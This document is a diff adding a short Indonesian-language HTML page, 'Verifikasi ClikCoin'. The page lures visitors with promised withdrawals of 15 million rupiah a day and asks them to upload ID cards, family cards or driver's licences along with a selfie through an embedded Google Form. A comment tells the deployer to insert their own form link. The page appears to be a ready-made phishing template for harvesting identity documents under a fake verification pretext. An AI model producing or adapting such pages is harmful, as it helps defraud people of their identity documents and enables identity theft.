@@ -1,0 +1,21 @@
+ <!DOCTYPE html>
+<html>
+<head>
+<title>Verifikasi ClikCoin</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body{margin:0;font-family:Arial;background:#0a0a0a;color:#fff;text-align:center}
+h2{color:#00ff88;margin-top:30px}
+p{color:#ccc;font-size:14px}
+iframe{width:100%;height:100vh;border:0;margin-top:10px}
+</style>
+</head>
+<body>
+<h2>🔒 Verifikasi Creator ClikCoin</h2>
+<p>Upload KTP/KK/SIM + Selfie biar WD 15jt/hari</p>
+
+<!-- GANTI LINK INI PAKE LINK GOOGLE FORM KAMU -->
+<iframe src="https://docs.google.com/forms/d/e/1FAIpQLSfXyZ123abc/viewform?embedded=true"></iframe>
+
+</body>
+</html>
